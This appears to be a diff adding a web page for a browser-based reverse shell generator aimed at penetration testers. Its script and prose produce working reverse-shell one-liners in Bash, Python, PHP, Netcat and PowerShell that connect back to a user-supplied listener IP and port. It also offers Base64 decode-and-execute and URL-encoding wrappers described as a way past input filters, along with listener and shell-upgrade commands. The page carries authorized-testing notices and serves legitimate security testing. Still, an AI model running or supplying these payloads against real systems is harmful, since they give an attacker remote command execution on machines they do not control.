@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reverse Shell Generator | Bash, Python, Netcat</title>
+<meta name="description" content="Generate reverse shell one-liners in Bash, Python, PHP, Netcat and PowerShell. Enter your IP and port for copy-ready payloads. Runs fully in browser.">
+<link rel="canonical" href="https://bugbountyreality.com/tools/reverse-shell-generator">
+<meta property="og:title" content="Reverse Shell Generator | Bash, Python, Netcat">
+<meta property="og:description" content="Generate reverse shell one-liners in Bash, Python, PHP, Netcat and PowerShell. Enter your IP and port for copy-ready payloads. Runs fully in browser.">
+<meta property="og:url" content="https://bugbountyreality.com/tools/reverse-shell-generator">
+<meta property="og:type" content="website">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebApplication",
+      "name": "Reverse Shell Generator",
+      "url": "https://bugbountyreality.com/tools/reverse-shell-generator",
+      "applicationCategory": "UtilitiesApplication",
+      "operatingSystem": "Any",
+      "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+      "author": { "@type": "Person", "name": "Michael Lip", "url": "https://zovo.one" }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://bugbountyreality.com/" },
+        { "@type": "ListItem", "position": 2, "name": "Tools", "item": "https://bugbountyreality.com/tools/" },
+        { "@type": "ListItem", "position": 3, "name": "Reverse Shell Generator | Bash, Python, Netcat", "item": "https://bugbountyreality.com/tools/reverse-shell-generator" }
+      ]
+    }
+  ]
+}
+</script>
+<style>
+:root{--bg:#0b0f14;--panel:#121821;--panel2:#0e141c;--ink:#e6edf3;--mut:#8b97a7;--acc:#5ee0a0;--acc2:#3fb6ff;--bd:#1f2a37;--warn:#ffb454;}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;line-height:1.6}
+nav{display:flex;gap:18px;padding:14px 20px;border-bottom:1px solid var(--bd);background:var(--panel2);font-size:14px}
+nav a{color:var(--acc2);text-decoration:none}
+nav a:hover{text-decoration:underline}
+main{max-width:860px;margin:0 auto;padding:24px 20px 60px}
+h1{font-size:28px;line-height:1.25;margin:18px 0 6px}
+h2{font-size:20px;margin:34px 0 10px;border-left:3px solid var(--acc);padding-left:10px}
+p.intro{color:var(--mut);font-size:16px}
+section#tool{background:var(--panel);border:1px solid var(--bd);border-radius:12px;padding:18px;margin:22px 0}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:14px}
+label{display:block;font-size:13px;color:var(--mut);margin-bottom:5px;font-weight:600}
+input,select{width:100%;padding:10px 12px;background:var(--panel2);border:1px solid var(--bd);border-radius:8px;color:var(--ink);font-size:14px;font-family:inherit}
+input:focus,select:focus{outline:none;border-color:var(--acc)}
+.out{margin-top:18px}
+.payload{background:#06090d;border:1px solid var(--bd);border-radius:8px;padding:12px 14px;margin-bottom:12px;position:relative}
+.payload .ttl{font-size:12px;color:var(--acc);text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;font-weight:700}
+.payload code{display:block;white-space:pre-wrap;word-break:break-all;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px;color:#d7e2ee}
+.cp{position:absolute;top:10px;right:10px;background:var(--bd);border:none;color:var(--ink);border-radius:6px;padding:4px 10px;font-size:11px;cursor:pointer;font-family:inherit}
+.cp:hover{background:#2a3a4d}
+.cp.ok{background:var(--acc);color:#05130b}
+.note{font-size:13px;color:var(--warn);background:rgba(255,180,84,.08);border:1px solid rgba(255,180,84,.25);border-radius:8px;padding:10px 12px;margin:14px 0}
+.listen{font-size:13px;color:var(--mut);margin-top:8px}
+.listen code{color:var(--acc2)}
+.prose{color:#cfd9e4;font-size:15px}
+.prose code{background:#06090d;padding:1px 5px;border-radius:4px;font-family:ui-monospace,monospace;font-size:13px}
+.rel a{display:inline-block;margin:6px 12px 6px 0;color:var(--acc2);text-decoration:none;border:1px solid var(--bd);border-radius:8px;padding:8px 14px;font-size:14px}
+.rel a:hover{border-color:var(--acc2)}
+footer{border-top:1px solid var(--bd);padding:22px 20px;text-align:center;color:var(--mut);font-size:13px}
+footer a{color:var(--acc2);text-decoration:none;margin:0 8px}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:14px}
+th,td{text-align:left;padding:7px 10px;border-bottom:1px solid var(--bd)}
+th{color:var(--acc)}
+</style>
+</head>
+<body>
+<nav>
+  <a href="/">bugbountyreality.com</a>
+  <a href="/tools/">All Tools</a>
+</nav>
+<main>
+  <h1>Build Reverse Shell One-Liners for Your Pentest</h1>
+  <p class="intro">Drop in your listener IP and port to get copy-ready reverse shell payloads across Bash, Python, PHP, Netcat and PowerShell. Everything is generated locally in your browser — no data leaves this page.</p>
+
+  <section id="tool">
+    <div class="grid">
+      <div>
+        <label for="ip">Listener IP (LHOST)</label>
+        <input id="ip" type="text" value="10.10.14.7" autocomplete="off" spellcheck="false">
+      </div>
+      <div>
+        <label for="port">Listener Port (LPORT)</label>
+        <input id="port" type="text" value="4444" autocomplete="off" spellcheck="false">
+      </div>
+      <div>
+        <label for="shell">Target Shell</label>
+        <select id="shell">
+          <option value="/bin/bash">/bin/bash</option>
+          <option value="/bin/sh">/bin/sh</option>
+          <option value="cmd.exe">cmd.exe (Windows)</option>
+          <option value="powershell">powershell</option>
+        </select>
+      </div>
+      <div>
+        <label for="enc">Encoding</label>
+        <select id="enc">
+          <option value="none">None (raw)</option>
+          <option value="b64">Base64 wrap</option>
+          <option value="url">URL-encode</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="note" id="warn">Authorized testing only. Use these payloads against systems you own or are explicitly contracted to test.</div>
+
+    <div class="out" id="out"></div>
+    <p class="listen">Start your listener first: <code id="listen">nc -lvnp 4444</code></p>
+  </section>
+
+  <h2>How this generator builds each payload</h2>
+  <div class="prose">
+    <p>A reverse shell flips the normal client-server direction: instead of you connecting <em>to</em> the target, the target connects back <em>to</em> your listener. Every payload below is assembled from three variables — <code>LHOST</code> (your IP), <code>LPORT</code> (your port) and the target's available interpreter — substituted into a known-good template string.</p>
+    <p>The core trick in most Unix payloads is file-descriptor redirection. The Bash one-liner opens a TCP socket through the kernel's <code>/dev/tcp/HOST/PORT</code> pseudo-device, then redirects stdin (<code>0</code>), stdout (<code>1</code>) and stderr (<code>2</code>) into that socket: <code>bash -i &gt;&amp; /dev/tcp/LHOST/LPORT 0&gt;&amp;1</code>. The <code>-i</code> flag forces an interactive shell so you get a prompt. The Python variant does the same job explicitly: it creates a socket, calls <code>connect((LHOST, LPORT))</code>, then <code>os.dup2()</code> clones the socket's file descriptor onto descriptors 0, 1 and 2 before spawning <code>pty.spawn()</code> for a real TTY.</p>
+    <p>The optional Base64 wrap is what defeats naive input filters. The generator takes the raw command bytes, computes the standard Base64 alphabet encoding in-browser (using <code>btoa</code> with a UTF-8 safe pre-pass), and emits a decode-and-execute stub such as <code>echo BASE64 | base64 -d | bash</code>. This is useful when a parameter strips spaces, quotes or slashes. URL-encoding instead percent-escapes every reserved character so the payload survives a query string or HTTP body. None of these transforms change what runs — they only change how the bytes travel.</p>
+    <p>The listener hint auto-updates to <code>nc -lvnp PORT</code> because a plain Netcat catcher is enough for these shells; for the PowerShell payload you may prefer a TLS-capable listener. Always upgrade a raw shell to a full PTY (<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>) once you land it.</p>
+  </div>
+
+  <h2>Quick reference</h2>
+  <table>
+    <tr><th>Payload</th><th>Needs on target</th><th>Best when</th></tr>
+    <tr><td>Bash /dev/tcp</td><td>Bash 2.04+</td><td>Linux, no extra binaries</td></tr>
+    <tr><td>Python</td><td>python/python3</td><td>You want a clean PTY</td></tr>
+    <tr><td>PHP</td><td>php CLI / web shell</td><td>LAMP web targets</td></tr>
+    <tr><td>Netcat -e</td><td>traditional nc</td><td>Old boxes, appliances</td></tr>
+    <tr><td>PowerShell</td><td>Windows PS</td><td>Windows hosts</td></tr>
+  </table>
+
+  <section class="rel">
+    <h2>Related Tools</h2>
+    <a href="/tools/api-scanner">API Scanner</a>
+    <a href="/tools/cors-checker">CORS Checker</a>
+  </section>
+</main>
+<footer>
+  <a href="/">Home</a> · <a href="/tools/">All Tools</a><br>
+  © 2026 bugbountyreality.com — for authorized security testing only.
+</footer>
+
+<script>
+(function(){
+  var ip=document.getElementById('ip'),port=document.getElementById('port'),
+      shell=document.getElementById('shell'),enc=document.getElementById('enc'),
+      out=document.getElementById('out'),listen=document.getElementById('listen'),warn=document.getElementById('warn');
+
+  function validIP(v){
+    var p=v.split('.');
+    if(p.length!==4)return v.length>0; // allow hostnames too
+    return p.every(function(o){var n=Number(o);return o!==''&&n>=0&&n<=255&&String(n)===o.replace(/^0(?=\d)/,'');});
+  }
+  function validPort(v){var n=Number(v);return Number.isInteger(n)&&n>0&&n<=65535;}
+
+  function b64(str){
+    try{return btoa(unescape(encodeURIComponent(str)));}
+    catch(e){return btoa(str);}
+  }
+  function urlenc(str){return encodeURIComponent(str);}
+
+  function build(h,p,sh){
+    var list=[];
+    var bashShell=(sh==='powershell'||sh==='cmd.exe')?'/bin/bash':sh;
+    list.push(['Bash /dev/tcp',bashShell+' -i >& /dev/tcp/'+h+'/'+p+' 0>&1']);
+    list.push(['Bash (read loop)','0<&196;exec 196<>/dev/tcp/'+h+'/'+p+'; '+bashShell+' <&196 >&196 2>&196']);
+    list.push(['Python3','python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("'+h+'",'+p+'));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("'+bashShell+'")\'']);
+    list.push(['PHP','php -r \'$s=fsockopen("'+h+'",'+p+');$p=proc_open("'+bashShell+' -i",array(0=>$s,1=>$s,2=>$s),$pipes);\'']);
+    list.push(['Netcat -e','nc '+h+' '+p+' -e '+bashShell]);
+    list.push(['Netcat (no -e)','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|'+bashShell+' -i 2>&1|nc '+h+' '+p+' >/tmp/f']);
+    if(sh==='powershell'||sh==='cmd.exe'){
+      list.push(['PowerShell','powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\''+h+'\','+p+');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"']);
+    }
+    return list;
+  }
+
+  function transform(cmd,mode){
+    if(mode==='b64'){
+      var payload=b64(cmd);
+      return 'echo '+payload+' | base64 -d | bash';
+    }
+    if(mode==='url')return urlenc(cmd);
+    return cmd;
+  }
+
+  function render(){
+    var h=ip.value.trim()||'LHOST',p=port.value.trim();
+    var pNum=validPort(p)?p:'PORT';
+    listen.textContent='nc -lvnp '+(validPort(p)?p:'4444');
+
+    var bad=[];
+    if(!validIP(ip.value.trim()))bad.push('IP/host');
+    if(!validPort(p))bad.push('port (1-65535)');
+    warn.innerHTML=bad.length
+      ? 'Check your '+bad.join(' and ')+'. Authorized testing only.'
+      : 'Authorized testing only. Use these payloads against systems you own or are explicitly contracted to test.';
+
+    var payloads=build(h,pNum,shell.value);
+    var html='';
+    payloads.forEach(function(item,i){
+      var raw=item[1];
+      var final=transform(raw,enc.value);
+      html+='<div class="payload"><div class="ttl">'+item[0]+'</div>'+
+            '<button class="cp" data-i="'+i+'">Copy</button>'+
+            '<code id="pl'+i+'"></code></div>';
+      // store text separately to avoid HTML injection
+      setTimeout(function(){var el=document.getElementById('pl'+i);if(el)el.textContent=final;},0);
+    });
+    out.innerHTML=html;
+
+    // re-fill text content synchronously after innerHTML set
+    payloads.forEach(function(item,i){
+      var el=document.getElementById('pl'+i);
+      if(el)el.textContent=transform(item[1],enc.value);
+    });
+
+    out.querySelectorAll('.cp').forEach(function(btn){
+      btn.addEventListener('click',function(){
+        var idx=btn.getAttribute('data-i');
+        var txt=document.getElementById('pl'+idx).textContent;
+        var done=function(){btn.textContent='Copied';btn.classList.add('ok');setTimeout(function(){btn.textContent='Copy';btn.classList.remove('ok');},1200);};
+        if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done,done);}
+        else{var t=document.createElement('textarea');t.value=txt;document.body.appendChild(t);t.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(t);done();}
+      });
+    });
+  }
+
+  [ip,port,shell,enc].forEach(function(el){
+    el.addEventListener('input',render);
+    el.addEventListener('change',render);
+  });
+  render();
+})();
+</script>
+</body>
+</html>
